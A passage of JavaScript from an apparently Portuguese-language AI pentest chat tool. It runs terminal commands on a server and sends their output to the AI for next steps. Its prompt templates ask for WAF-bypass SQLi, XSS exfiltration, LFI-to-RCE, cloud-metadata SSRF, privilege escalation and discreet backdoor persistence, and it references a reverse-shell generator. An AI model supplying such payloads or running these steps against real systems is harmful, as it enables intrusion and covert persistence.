            'nmap': { desc: 'Scanner de portas', example: 'nmap -sV example.com' },
            'nikto': { desc: 'Scanner de vulnerabilidades web', example: 'nikto -h example.com' },
            'gobuster': { desc: 'Fuzzing de diretórios', example: 'gobuster dir -u http://example.com -w wordlist.txt' },
            'wpscan': { desc: 'Scanner WordPress', example: 'wpscan --url example.com' },
            'subfinder': { desc: 'Descoberta de subdomínios', example: 'subfinder -d example.com' },
        };
        
        // Verifica se a mensagem é um comando de terminal
        function isTerminalCommand(text) {
            return text.startsWith(TERMINAL_PREFIX) && text.length > 1;
        }
        
        // Extrai o comando do texto (remove o prefixo $)
        function extractCommand(text) {
            return text.substring(1).trim();
        }
        
        // Verifica se é comando help
        function isHelpCommand(command) {
            const cmd = command.toLowerCase().trim();
            return cmd === 'help' || cmd === '?' || cmd === 'commands' || cmd === 'ajuda';
        }
        
        // Mostra help dos comandos (sem enviar para IA)
        function showTerminalHelp() {
            sessionWelcome.classList.add('hidden');
            messagesContainer.classList.remove('hidden');
            
            addMessage({ role: 'user', content: '`$ help`' });
            
            let helpHTML = `
                <div class="terminal-result my-3 rounded-lg overflow-hidden" style="background: rgba(0,0,0,0.4); border: 1px solid rgba(0,212,255,0.2);">
                    <div class="flex items-center gap-2 px-3 py-2" style="background: rgba(0,212,255,0.1); border-bottom: 1px solid rgba(0,212,255,0.1);">
                        <i class="fas fa-terminal text-[#00d4ff] text-xs"></i>
                        <span class="text-xs font-mono text-[#00d4ff]">Terminal - Comandos Disponíveis</span>
                    </div>
                    <div class="p-3 space-y-2">
                        <p class="text-xs text-gray-400 mb-3">Digite <code class="text-[#00ff88]">$ comando alvo</code> para executar. A IA analisa o resultado automaticamente.</p>
                        <div class="grid gap-1">
            `;
            
            for (const [cmd, info] of Object.entries(terminalCommands)) {
                helpHTML += `
                    <div class="flex items-start gap-3 py-1.5 border-b border-[rgba(255,255,255,0.05)] last:border-0">
                        <code class="text-[#00ff88] text-xs font-mono w-20 flex-shrink-0">${cmd}</code>
                        <span class="text-gray-400 text-xs flex-1">${info.desc}</span>
                    </div>
                `;
            }
            
            helpHTML += `
                        </div>
                        <div class="mt-3 pt-3 border-t border-[rgba(255,255,255,0.1)]">
                            <p class="text-[10px] text-gray-500"><i class="fas fa-info-circle text-[#00d4ff] mr-1"></i> Rate limit: 10 cmd/min, 60 cmd/hora</p>
                        </div>
                    </div>
                </div>
            `;
            
            messagesContainer.insertAdjacentHTML('beforeend', `
                <div class="flex gap-3 p-4 animate-slide-in">
                    <div class="flex-shrink-0 w-8 h-8 rounded-lg flex items-center justify-center" style="background: linear-gradient(135deg, rgba(0, 212, 255, 0.2), rgba(0, 255, 136, 0.1)); border: 1px solid rgba(0, 212, 255, 0.3);">
                        <i class="fas fa-terminal text-[#00d4ff] text-sm"></i>
                    </div>
                    <div class="flex-1 min-w-0">
                        ${helpHTML}
                    </div>
                </div>
            `);
            scrollToBottom();
        }
        
        // Executa comando no terminal e retorna resultado
        async function executeTerminalCommand(command) {
            try {
                const response = await fetch('/api/terminal/execute', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${token}`
                    },
                    body: JSON.stringify({ command })
                });
                
                const data = await response.json();
                return {
                    success: data.success,
                    output: data.output,
                    type: data.type || 'output',
                    exitCode: data.exit_code
                };
            } catch (error) {
                return {
                    success: false,
                    output: `Erro de conexão: ${error.message}`,
                    type: 'error'
                };
            }
        }
        
        // Cria HTML para exibir resultado do terminal no chat
        function createTerminalResultHTML(command, result) {
            const statusIcon = result.success ? '✓' : '✗';
            const statusColor = result.success ? '#00ff88' : '#ff4444';
            const outputClass = result.type === 'error' ? 'text-red-400' : (result.type === 'warning' ? 'text-yellow-400' : 'text-[#00d4ff]');
            
            return `
                <div class="terminal-result my-3 rounded-lg overflow-hidden" style="background: rgba(0,0,0,0.4); border: 1px solid rgba(0,212,255,0.2);">
                    <div class="flex items-center gap-2 px-3 py-2" style="background: rgba(0,212,255,0.1); border-bottom: 1px solid rgba(0,212,255,0.1);">
                        <i class="fas fa-terminal text-[#00d4ff] text-xs"></i>
                        <span class="text-xs font-mono text-[#00d4ff]">Terminal</span>
                        <span class="ml-auto text-xs" style="color: ${statusColor}">${statusIcon}</span>
                    </div>
                    <div class="p-3">
                        <div class="flex items-center gap-2 mb-2">
                            <span class="text-[#00ff88] text-xs">$</span>
                            <code class="text-sm text-white font-mono">${escapeHtml(command)}</code>
                        </div>
                        <pre class="text-xs ${outputClass} font-mono whitespace-pre-wrap overflow-x-auto max-h-64 overflow-y-auto" style="background: transparent; border: none; padding: 0; margin: 0;">${escapeHtml(result.output)}</pre>
                    </div>
                </div>
            `;
        }
        
        // Escape HTML para evitar XSS
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // Processa comando do terminal e envia para IA analisar
        async function processTerminalCommand(command) {
            // Verifica se usuário tem acesso ao terminal
            if (!userHasTerminalAccess()) {
                showNotification('Terminal disponível apenas no plano Full Attack', 'warning');
                addMessage({
                    role: 'assistant',
                    content: `⚠️ **Terminal não disponível**\n\nO terminal integrado está disponível apenas no plano **Full Attack**.\n\nSeu plano atual: **${currentUser?.plan?.name || 'Pentest'}**\n\nFaça upgrade para ter acesso ao terminal e executar comandos diretamente no chat.`
                });
                return;
            }
            
            // Esconde welcome e mostra chat
            sessionWelcome.classList.add('hidden');
            messagesContainer.classList.remove('hidden');
            
            // Mostra mensagem do usuário com o comando
            addMessage({ 
                role: 'user', 
                content: `\`$ ${command}\`` 
            });
            
            // Mostra loading
            typingIndicator.classList.remove('hidden');
            sendBtn.classList.add('hidden');
            scrollToBottom();
            
            // Executa o comando
            const result = await executeTerminalCommand(command);
            
            // Adiciona ao histórico
            terminalHistory.push({ command, result, timestamp: new Date() });
            
            // Esconde loading
            typingIndicator.classList.add('hidden');
            
            // Cria mensagem com resultado do terminal
            const terminalHTML = createTerminalResultHTML(command, result);
            
            // Agora envia para a IA analisar o resultado
            const aiPrompt = `Executei o seguinte comando no terminal:

\`\`\`bash
$ ${command}
\`\`\`

**Resultado:**
\`\`\`
${result.output}
\`\`\`

${result.success ? 'O comando foi executado com sucesso.' : 'O comando falhou ou retornou erro.'}

Analise este resultado e me ajude a:
1. Entender o que significa
2. Identificar possíveis vulnerabilidades ou informações úteis para pentest
3. Sugerir próximos comandos ou passos`;

            // Mostra o resultado do terminal primeiro
            messagesContainer.insertAdjacentHTML('beforeend', `
                <div class="flex gap-3 p-4 animate-slide-in">
                    <div class="flex-shrink-0 w-8 h-8 rounded-lg flex items-center justify-center" style="background: linear-gradient(135deg, rgba(0, 212, 255, 0.2), rgba(0, 255, 136, 0.1)); border: 1px solid rgba(0, 212, 255, 0.3);">
                        <i class="fas fa-terminal text-[#00d4ff] text-sm"></i>
                    </div>
                    <div class="flex-1 min-w-0">
                        ${terminalHTML}
                    </div>
                </div>
            `);
            scrollToBottom();
            
            // Agora envia para a IA analisar
            typingIndicator.classList.remove('hidden');
            currentAbortController = new AbortController();
            
            let streamingDiv = null;
            
            try {
                const response = await fetch(`/api/chat/sessions/${currentSession.id}/messages/stream`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'text/event-stream',
                        'Authorization': `Bearer ${token}`
                    },
                    body: JSON.stringify({ message: aiPrompt }),
                    signal: currentAbortController.signal
                });
                
                if (response.status === 429) {
                    typingIndicator.classList.add('hidden');
                    sendBtn.classList.remove('hidden');
                    showLimitReachedModal();
                    return;
                }
                
                if (!response.ok) throw new Error('Streaming failed');
                
                typingIndicator.classList.add('hidden');
                streamingDiv = document.createElement('div');
                streamingDiv.id = 'streamingResponse';
                streamingDiv.innerHTML = createMessageHTML({ role: 'assistant', content: '<span class="streaming-cursor">▊</span>' });
                messagesContainer.appendChild(streamingDiv);
                scrollToBottom();
                
                const reader = response.body.getReader();
                const decoder = new TextDecoder();
                let fullContent = '';
                
                while (true) {
                    const { done, value } = await reader.read();
                    if (done) break;
                    
                    const chunk = decoder.decode(value);
                    const lines = chunk.split('\n');
                    
                    for (const line of lines) {
                        if (line.startsWith('data: ')) {
                            try {
                                const data = JSON.parse(line.slice(6));
                                if (data.content) {
                                    fullContent += data.content;
                                    const contentDiv = streamingDiv.querySelector('.message-content');
                                    if (contentDiv) {
                                        contentDiv.innerHTML = marked.parse(fullContent) + '<span class="streaming-cursor">▊</span>';
                                    }
                                    scrollToBottom();
                                } else if (data.done) {
                                    const contentDiv = streamingDiv.querySelector('.message-content');
                                    if (contentDiv) {
                                        contentDiv.innerHTML = marked.parse(fullContent);
                                    }
                                    streamingDiv.removeAttribute('id');
                                    processCodeBlocks();
                                } else if (data.error) {
                                    throw new Error(data.error);
                                }
                            } catch (parseError) {}
                        }
                    }
                }
            } catch (error) {
                if (error.name === 'AbortError') {
                    if (streamingDiv) streamingDiv.remove();
                    addMessage({ role: 'assistant', content: '⚠️ **Análise cancelada.**' });
                } else {
                    if (streamingDiv) streamingDiv.remove();
                    addMessage({ role: 'assistant', content: '❌ **Erro ao analisar resultado.** Tente novamente.' });
                }
            } finally {
                typingIndicator.classList.add('hidden');
                sendBtn.classList.remove('hidden');
                cancelBtn.classList.add('hidden');
                currentAbortController = null;
                messageInput.focus();
            }
        }
        
        // Controle de scroll - não interrompe se usuário estiver lendo acima
        let userScrolledUp = false;
        
        function scrollToBottom(force = false) {
            const container = document.getElementById('chatContainer');
            
            // Se forçado ou usuário não scrollou para cima, faz scroll
            if (force || !userScrolledUp) {
                container.scrollTop = container.scrollHeight;
            }
        }
        
        // Detecta quando usuário scrolla manualmente
        document.getElementById('chatContainer').addEventListener('scroll', function() {
            const container = this;
            const isNearBottom = container.scrollHeight - container.scrollTop - container.clientHeight < 100;
            userScrolledUp = !isNearBottom;
        });
        
        // Reset quando nova mensagem é enviada
        function resetScrollState() {
            userScrolledUp = false;
        }
        
        messageForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const hasText = messageInput.value.trim();
            const hasAttachment = currentAttachment !== null;
            
            if (!currentSession || (!hasText && !hasAttachment)) return;
            
            // Verifica se é um comando de terminal
            const inputText = messageInput.value.trim();
            if (isTerminalCommand(inputText) && !hasAttachment) {
                const command = extractCommand(inputText);
                messageInput.value = '';
                
                // Se for help, mostra lista de comandos sem enviar para IA
                if (isHelpCommand(command)) {
                    showTerminalHelp();
                    return;
                }
                
                await processTerminalCommand(command);
                return;
            }
            
            // Monta a mensagem com o anexo se houver
            let content = messageInput.value.trim();
            let displayContent = content;
            let attachmentData = null;
            
            if (hasAttachment) {
                if (currentAttachment.type === 'code') {
                    // Para codigo/scripts, inclui o conteudo completo para a IA
                    const codeBlock = '```' + (currentAttachment.extension || '') + '\n' + currentAttachment.content + '\n```';
                    const userText = content; // Guarda texto original do usuario
                    const prefix = content ? content + '\n\n' : '';
                    content = prefix + `**Arquivo: ${currentAttachment.name}** (${countLines(currentAttachment.content)} linhas)\n\n${codeBlock}`;
                    // Display mostra APENAS o texto do usuario (sem codigo)
                    displayContent = userText;
                    attachmentData = {
                        type: 'code',
                        name: currentAttachment.name,
                        extension: currentAttachment.extension || 'txt',
                        lines: countLines(currentAttachment.content),
                        size: formatFileSize(currentAttachment.size)
                    };
                } else if (currentAttachment.type === 'image') {
                    // Para imagens, envia como base64
                    const userText = content; // Guarda texto original do usuario
                    const prefix = content ? content + '\n\n' : '';
                    content = prefix + `[IMAGEM ANEXADA: ${currentAttachment.name}]\n${currentAttachment.content}`;
                    // Display mostra APENAS o texto do usuario (sem dados da imagem)
                    displayContent = userText;
                    attachmentData = {
                        type: 'image',
                        name: currentAttachment.name,
                        size: formatFileSize(currentAttachment.size),
                        preview: currentAttachment.content
                    };
                }
            }
            
            messageInput.value = '';
            removeAttachment(); // Limpa o anexo apos enviar
            
            // Esconde o welcome da sessao e mostra o chat
            sessionWelcome.classList.add('hidden');
            messagesContainer.classList.remove('hidden');
            
            // Reset scroll state quando usuário envia mensagem
            resetScrollState();
            addMessage({ role: 'user', content: displayContent, attachment: attachmentData });
            
            // Atualiza título da sessão se for a primeira mensagem
            if (currentSession?.isNew && displayContent) {
                updateSessionTitle(displayContent);
            }
            
            // Mostra loading animado e botão de cancelar
            typingIndicator.classList.remove('hidden');
            scrollToBottom();
            sendBtn.classList.add('hidden');
            cancelBtn.classList.remove('hidden');
            
            // Cria AbortController para permitir cancelamento
            currentAbortController = new AbortController();
            
            // Tenta streaming primeiro, fallback para normal
            let streamingSuccess = false;
            let streamingDiv = null;
            
            try {
                // Tenta usar streaming para resposta mais rapida
                const response = await fetch(`/api/chat/sessions/${currentSession.id}/messages/stream`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'text/event-stream',
                        'Authorization': `Bearer ${token}`
                    },
                    body: JSON.stringify({ message: content }),
                    signal: currentAbortController.signal
                });
                
                // Verifica se atingiu limite diário (429)
                if (response.status === 429) {
                    typingIndicator.classList.add('hidden');
                    sendBtn.classList.remove('hidden');
                    cancelBtn.classList.add('hidden');
                    sendBtn.disabled = false;
                    showLimitReachedModal();
                    return;
                }
                
                if (!response.ok) {
                    throw new Error('Streaming failed');
                }
                
                // Esconde o loading e cria div de streaming
                typingIndicator.classList.add('hidden');
                streamingDiv = document.createElement('div');
                streamingDiv.id = 'streamingResponse';
                streamingDiv.innerHTML = createMessageHTML({ role: 'assistant', content: '<span class="streaming-cursor">▊</span>' });
                messagesContainer.appendChild(streamingDiv);
                scrollToBottom();
                
                const reader = response.body.getReader();
                const decoder = new TextDecoder();
                let fullContent = '';
                
                while (true) {
                    const { done, value } = await reader.read();
                    if (done) break;
                    
                    const chunk = decoder.decode(value);
                    const lines = chunk.split('\n');
                    
                    for (const line of lines) {
                        if (line.startsWith('data: ')) {
                            try {
                                const data = JSON.parse(line.slice(6));
                                if (data.content) {
                                    fullContent += data.content;
                                    // Atualiza o conteudo em tempo real
                                    const contentDiv = streamingDiv.querySelector('.message-content');
                                    if (contentDiv) {
                                        contentDiv.innerHTML = marked.parse(fullContent) + '<span class="streaming-cursor">▊</span>';
                                    }
                                    scrollToBottom();
                                } else if (data.done) {
                                    // Streaming completo - remove cursor e remove ID
                                    streamingSuccess = true;
                                    const contentDiv = streamingDiv.querySelector('.message-content');
                                    if (contentDiv) {
                                        contentDiv.innerHTML = marked.parse(fullContent);
                                    }
                                    // Remove o ID para evitar duplicação
                                    streamingDiv.removeAttribute('id');
                                    // Processa blocos de código para adicionar botão copiar
                                    processCodeBlocks();
                                } else if (data.error) {
                                    throw new Error(data.error);
                                }
                            } catch (parseError) {
                                // Ignora erros de parse em linhas vazias
                            }
                        }
                    }
                }
                
            } catch (streamError) {
                // Verifica se foi cancelado pelo usuário
                if (streamError.name === 'AbortError') {
                    // Remove div de streaming se existir
                    if (streamingDiv) {
                        streamingDiv.remove();
                    }
                    
                    typingIndicator.classList.add('hidden');
                    
                    // Mostra mensagem de cancelamento
                    addMessage({ 
                        role: 'assistant', 
                        content: '⚠️ **Resposta cancelada.** Você pode enviar uma nova mensagem.' 
                    });
                } else {
                    // Remove div de streaming se existir
                    if (streamingDiv) {
                        streamingDiv.remove();
                    }
                    
                    typingIndicator.classList.add('hidden');
                    
                    // NÃO faz fallback para evitar duplicação de mensagem
                    // A mensagem do usuário já foi salva pelo stream, então mostra erro
                    addMessage({ 
                        role: 'assistant', 
                        content: '❌ **Erro de conexão.** Por favor, recarregue a página e tente novamente.' 
                    });
                }
            } finally {
                typingIndicator.classList.add('hidden');
                sendBtn.classList.remove('hidden');
                cancelBtn.classList.add('hidden');
                sendBtn.disabled = false;
                currentAbortController = null;
                messageInput.focus();
            }
        });
        
        // Evento do botão cancelar
        cancelBtn.addEventListener('click', () => {
            if (currentAbortController) {
                currentAbortController.abort();
            }
        });
        
        // Modal de limite atingido
        function showLimitReachedModal() {
            const existingModal = document.getElementById('limitReachedModal');
            if (existingModal) existingModal.remove();
            
            const modal = document.createElement('div');
            modal.id = 'limitReachedModal';
            modal.className = 'fixed inset-0 z-50 flex items-center justify-center bg-slate-950/95';
            modal.innerHTML = `
                <div class="bg-slate-900 rounded-2xl p-8 max-w-md text-center border border-red-500/30 mx-4">
                    <div class="w-16 h-16 rounded-full bg-red-500/20 flex items-center justify-center mx-auto mb-4">
                        <i class="fas fa-exclamation-triangle text-3xl text-red-500"></i>
                    </div>
                    <h2 class="text-xl font-bold text-white mb-2">Limite Diário Atingido</h2>
                    <p class="text-gray-400 mb-6">Você atingiu o limite de requisições do seu plano. Faça upgrade para continuar usando.</p>
                    <div class="flex gap-3 justify-center">
                        <button onclick="document.getElementById('limitReachedModal').remove()" class="px-6 py-2 bg-slate-700 text-white rounded-lg hover:bg-slate-600 transition-colors">
                            Fechar
                        </button>
                        <a href="/profile" class="px-6 py-2 bg-gradient-to-r from-purple-500 to-indigo-500 text-white rounded-lg hover:opacity-90 transition-colors inline-flex items-center gap-2">
                            <i class="fas fa-gem"></i> Ver Planos
                        </a>
                    </div>
                </div>
            `;
            document.body.appendChild(modal);
        }
        
        messageInput.addEventListener('input', function() {
            this.style.height = 'auto';
            this.style.height = Math.min(this.scrollHeight, 150) + 'px';
        });
        
        messageInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                messageForm.dispatchEvent(new Event('submit'));
            }
        });
        
        // Mobile Sidebar Toggle Functions
        const mobileMenuBtn = document.getElementById('mobileMenuBtn');
        const closeSidebarBtn = document.getElementById('closeSidebarBtn');
        const sidebar = document.getElementById('sidebar');
        const mobileOverlay = document.getElementById('mobileOverlay');
        
        function openMobileSidebar() {
            sidebar.classList.add('mobile-open');
            mobileOverlay.classList.add('active');
            document.body.style.overflow = 'hidden';
        }
        
        function closeMobileSidebar() {
            sidebar.classList.remove('mobile-open');
            mobileOverlay.classList.remove('active');
            document.body.style.overflow = '';
        }

        // Toggle Tools Menu in navbar
        function toggleToolsMenu(event) {
            event.preventDefault();
            event.stopPropagation();
            const menu = document.getElementById('toolsMenuChat');
            menu.classList.toggle('hidden');
        }

        // Close tools menu when clicking outside
        document.addEventListener('click', function(e) {
            const menu = document.getElementById('toolsMenuChat');
            const dropdown = document.querySelector('.tools-dropdown-chat');
            if (menu && dropdown && !dropdown.contains(e.target)) {
                menu.classList.add('hidden');
            }
        });
        
        if (mobileMenuBtn) {
            mobileMenuBtn.addEventListener('click', openMobileSidebar);
        }
        
        if (closeSidebarBtn) {
            closeSidebarBtn.addEventListener('click', closeMobileSidebar);
        }
        
        // Close sidebar when clicking on a session (mobile)
        function handleMobileSessionClick() {
            if (window.innerWidth < 1024) {
                closeMobileSidebar();
            }
        }
        
        // Beta banner
        function closeBetaBanner() {
            const banner = document.getElementById('betaBanner');
            if (banner) {
                banner.style.transition = 'all 0.3s ease';
                banner.style.opacity = '0';
                banner.style.maxHeight = '0';
                banner.style.padding = '0';
                setTimeout(() => banner.remove(), 300);
                sessionStorage.setItem('betaBannerClosed', 'true');
            }
        }
        
        // Check if banner was closed this session
        if (sessionStorage.getItem('betaBannerClosed') === 'true') {
            document.getElementById('betaBanner')?.remove();
        }
        
        // ========================================
        // FERRAMENTAS DE PENTEST
        // ========================================
        
        // Templates de Prompts
        const promptTemplates = {
            // Reconhecimento
            recon_subdomain: 'Preciso enumerar subdomínios do alvo. Me dê comandos para usar subfinder, amass, assetfinder e técnicas de DNS bruteforce. Inclua também como verificar quais estão ativos.',
            recon_tech: 'Quero identificar as tecnologias usadas no alvo (web server, frameworks, CMS, linguagens). Me dê comandos para whatweb, wappalyzer, builtwith e análise manual de headers/responses.',
            recon_ports: 'Preciso fazer um scan de portas completo. Me dê comandos nmap para: scan rápido, scan completo, detecção de versões, scripts NSE úteis e técnicas de evasão de firewall.',
            
            // Exploração Web
            sqli: 'Encontrei um possível ponto de SQL Injection. Me dê payloads para: detecção, bypass de WAF, union-based, blind boolean, blind time-based, e comandos sqlmap otimizados.',
            xss: 'Preciso testar XSS em um formulário. Me dê payloads para: reflected, stored, DOM-based, bypass de filtros comuns, polyglots e técnicas de exfiltração de dados.',
            lfi: 'Encontrei possível LFI. Me dê payloads para: path traversal, null byte, wrappers PHP (php://filter, data://), log poisoning e técnicas para RCE via LFI.',
            ssrf: 'Preciso testar SSRF. Me dê payloads para: bypass de filtros, acesso a metadados cloud (AWS/GCP/Azure), port scanning interno e técnicas de exfiltração.',
            
            // Pós-Exploração
            privesc_linux: 'Consegui shell em Linux. Me dê um checklist completo de privilege escalation: SUID, capabilities, sudo, cron, kernel exploits, e comandos para enumerar tudo automaticamente.',
            privesc_windows: 'Consegui shell em Windows. Me dê técnicas de privilege escalation: tokens, services, scheduled tasks, AlwaysInstallElevated, unquoted paths e ferramentas como winPEAS.',
            persistence: 'Preciso manter acesso ao sistema. Me dê técnicas de persistência para Linux e Windows: backdoors, scheduled tasks, registry, services e métodos mais discretos.',
            
            // Relatórios
            report_vuln: 'Encontrei uma vulnerabilidade e preciso documentar. Me ajude a criar um relatório com: descrição, impacto (CVSS), passos para reproduzir, evidências necessárias e recomendações.',
            report_exec: 'Preciso criar um resumo executivo do pentest. Me dê um template com: escopo, metodologia, principais achados, riscos críticos e recomendações priorizadas.'
        };
        
        // OWASP Top 10 Checklist
        const owaspChecklist = [
            { id: 'a01', code: 'A01:2021', text: 'Broken Access Control - Testar IDOR, privilege escalation, bypass de autenticação' },
            { id: 'a02', code: 'A02:2021', text: 'Cryptographic Failures - Verificar TLS, hashing de senhas, dados sensíveis expostos' },
            { id: 'a03', code: 'A03:2021', text: 'Injection - Testar SQLi, XSS, Command Injection, LDAP, XPath' },
            { id: 'a04', code: 'A04:2021', text: 'Insecure Design - Analisar fluxos de negócio, threat modeling' },
            { id: 'a05', code: 'A05:2021', text: 'Security Misconfiguration - Headers, CORS, directory listing, default creds' },
            { id: 'a06', code: 'A06:2021', text: 'Vulnerable Components - Verificar versões, CVEs conhecidos, dependências' },
            { id: 'a07', code: 'A07:2021', text: 'Auth Failures - Brute force, session management, password policy' },
            { id: 'a08', code: 'A08:2021', text: 'Software & Data Integrity - Verificar CI/CD, updates sem assinatura, deserialização' },
            { id: 'a09', code: 'A09:2021', text: 'Logging & Monitoring - Verificar se ataques são detectados e logados' },
            { id: 'a10', code: 'A10:2021', text: 'SSRF - Testar requisições server-side, bypass de filtros, cloud metadata' }
        ];
        
        // Carregar estado do checklist do localStorage
        let checklistState = JSON.parse(localStorage.getItem('deepeyes_checklist') || '{}');
        
        // Templates Modal
        function openTemplatesModal() {
            // Só abre se tiver uma sessão ativa
            if (!currentSession) {
                showNotification('Inicie uma sessão primeiro para usar templates', 'warning');
                return;
            }
            const modal = document.getElementById('templatesModal');
            modal.classList.remove('hidden');
            modal.classList.add('flex');
        }
        
        function closeTemplatesModal() {
            const modal = document.getElementById('templatesModal');
            modal.classList.add('hidden');
            modal.classList.remove('flex');
        }
        
        function useTemplate(templateId) {
            const template = promptTemplates[templateId];
            if (template && messageInput) {
                messageInput.value = template;
                messageInput.style.height = 'auto';
                messageInput.style.height = Math.min(messageInput.scrollHeight, 150) + 'px';
                closeTemplatesModal();
                messageInput.focus();
                showNotification('Template carregado!', 'success');
            }
        }
        
        // Checklist Modal
        function openChecklistModal() {
            const modal = document.getElementById('checklistModal');
            modal.classList.remove('hidden');
            modal.classList.add('flex');
            renderChecklist();
        }
        
        function closeChecklistModal() {
            const modal = document.getElementById('checklistModal');
            modal.classList.add('hidden');
            modal.classList.remove('flex');
        }
        
        function renderChecklist() {
            const container = document.getElementById('checklistItems');
            container.innerHTML = owaspChecklist.map(item => `
                <div class="checklist-item ${checklistState[item.id] ? 'checked' : ''}" onclick="toggleChecklistItem('${item.id}')">
                    <div class="check-box">
                        <i class="fas fa-check"></i>
                    </div>
                    <span class="item-text">${item.text}</span>
                    <span class="item-code">${item.code}</span>
                </div>
            `).join('');
            updateChecklistProgress();
        }
        
        function toggleChecklistItem(itemId) {
            checklistState[itemId] = !checklistState[itemId];
            localStorage.setItem('deepeyes_checklist', JSON.stringify(checklistState));
            renderChecklist();
        }
        
        function updateChecklistProgress() {
            const total = owaspChecklist.length;
            const checked = Object.values(checklistState).filter(v => v).length;
            const percent = Math.round((checked / total) * 100);
            
            document.getElementById('checklistProgress').style.width = percent + '%';
            document.getElementById('checklistPercent').textContent = percent + '%';
        }
        
        function resetChecklist() {
            checklistState = {};
            localStorage.setItem('deepeyes_checklist', JSON.stringify(checklistState));
            renderChecklist();
            showNotification('Checklist resetado!', 'success');
        }
        
        // Export Chat
        function exportChat() {
            if (!currentSession) {
                showNotification('Nenhuma sessão ativa para exportar', 'error');
                return;
            }
            openExportModal();
        }
        
        function openExportModal() {
            const modal = document.getElementById('exportModal');
            modal.classList.remove('hidden');
            modal.classList.add('flex');
        }
        
        function closeExportModal() {
            const modal = document.getElementById('exportModal');
            modal.classList.add('hidden');
            modal.classList.remove('flex');
        }
        
        async function downloadChat(format) {
            if (!currentSession) {
                showNotification('Nenhuma sessão para exportar', 'error');
                return;
            }
            
            try {
                // Busca mensagens da sessão atual
                const data = await api(`/chat/sessions/${currentSession.id}/messages`);
                const messages = data.data || [];
                
                if (messages.length === 0) {
                    showNotification('Nenhuma mensagem para exportar', 'error');
                    return;
                }
                
                let content = '';
                const sessionTitle = currentSession.title || 'Chat DeepEyes';
                const sessionDate = new Date().toLocaleDateString('pt-BR');
                const sessionProfile = currentSession.profile || 'pentest';
                
                if (format === 'md') {
                    // Formato Markdown
                    content = `# ${sessionTitle}\n\n`;
                    content += `**Data:** ${sessionDate}\n`;
                    content += `**Perfil:** ${sessionProfile}\n`;
                    content += `**Alvo:** ${currentSession.target_domain || 'N/A'}\n\n`;
                    content += `---\n\n`;
                    
                    messages.forEach(msg => {
                        const role = msg.role === 'user' ? '👤 **Você**' : '🤖 **DeepEyes**';
                        content += `${role}\n\n${msg.content}\n\n---\n\n`;
                    });
                } else {
                    // Formato texto simples
                    content = `${sessionTitle}\n`;
                    content += `${'='.repeat(50)}\n`;
                    content += `Data: ${sessionDate}\n`;
                    content += `Perfil: ${sessionProfile}\n`;
                    content += `Alvo: ${currentSession.target_domain || 'N/A'}\n\n`;
                    
                    messages.forEach(msg => {
                        const role = msg.role === 'user' ? '[VOCÊ]' : '[DEEPEYES]';
                        content += `${role}\n${msg.content}\n\n${'-'.repeat(40)}\n\n`;
                    });
                }
                
                // Cria e baixa o arquivo
                const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `deepeyes_${sessionTitle.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.${format}`;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                
                closeExportModal();
                showNotification('Chat exportado com sucesso!', 'success');
            } catch (error) {
                console.error('Erro ao exportar:', error);
                showNotification('Erro ao exportar chat', 'error');
            }
        }
        
        // Nmap Generator Functions
        function openNmapModal() {
            const modal = document.getElementById('nmapModal');
            modal.classList.remove('hidden');
            modal.classList.add('flex');
            document.getElementById('nmapOutput').classList.add('hidden');
        }
        
        function closeNmapModal() {
            const modal = document.getElementById('nmapModal');
            modal.classList.add('hidden');
            modal.classList.remove('flex');
        }
        
        function generateNmapCommand() {
            const target = document.getElementById('nmapTarget').value.trim();
            if (!target) {
                showNotification('Digite um alvo (IP ou domínio)', 'error');
                return;
            }
            
            const scanType = document.getElementById('nmapScanType').value;
            const detectOS = document.getElementById('nmapOS').checked;
            const scripts = document.getElementById('nmapScripts').checked;
            const verbose = document.getElementById('nmapVerbose').checked;
            const noPing = document.getElementById('nmapNoPin').checked;
            
            let cmd = 'nmap';
            
            // Tipo de scan
            switch(scanType) {
                case 'quick': cmd += ' -F'; break;
                case 'full': cmd += ' -p-'; break;
                case 'top100': cmd += ' --top-ports 100'; break;
                case 'top1000': cmd += ' --top-ports 1000'; break;
                case 'udp': cmd += ' -sU'; break;
                case 'stealth': cmd += ' -sS'; break;
                case 'version': cmd += ' -sV'; break;
                case 'aggressive': cmd += ' -A'; break;
                case 'vuln': cmd += ' --script vuln'; break;
            }
            
            // Opções adicionais
            if (detectOS) cmd += ' -O';
            if (scripts && scanType !== 'vuln') cmd += ' -sC';
            if (verbose) cmd += ' -v';
            if (noPing) cmd += ' -Pn';
            
            cmd += ` ${target}`;
            
            document.getElementById('nmapCommand').textContent = cmd;
            document.getElementById('nmapOutput').classList.remove('hidden');
        }
        
        function copyNmapCommand() {
            const cmd = document.getElementById('nmapCommand').textContent;
            navigator.clipboard.writeText(cmd).then(() => {
                showNotification('Comando copiado!', 'success');
            });
        }
        
        // Wordlist Modal Functions
        function openWordlistModal() {
            const modal = document.getElementById('wordlistModal');
            modal.classList.remove('hidden');
            modal.classList.add('flex');
        }
        
        function closeWordlistModal() {
            const modal = document.getElementById('wordlistModal');
            modal.classList.add('hidden');
            modal.classList.remove('flex');
        }
        
        // ========================================
        // FERRAMENTAS PRO - openTool
        // ========================================
        function openTool(toolName) {
            // Verifica se usuário tem acesso (trial ou plano pago)
            if (!checkToolAccess()) {
                showUpgradeModal();
                return;
            }
            
            switch(toolName) {
                case 'decoder':
                    openDecoderModal();
                    break;
                case 'hash':
                    openHashModal();
                    break;
                case 'revshell':
                    openRevshellModal();
                    break;
                case 'wordlist':
                    openWordlistModal();
                    break;
                default:
                    showNotification('Ferramenta não encontrada', 'error');
            }
        }
        
        function checkToolAccess() {
            // Admin sempre tem acesso
            if (currentUser?.role === 'admin') return true;
            
            // Verifica se tem plano Pro/Elite
            const planId = currentUser?.plan_id;
            if (planId && planId > 1) return true;
            
            // Verifica trial (2 dias)
            const trialEndsAt = currentUser?.trial_ends_at;
            if (trialEndsAt) {
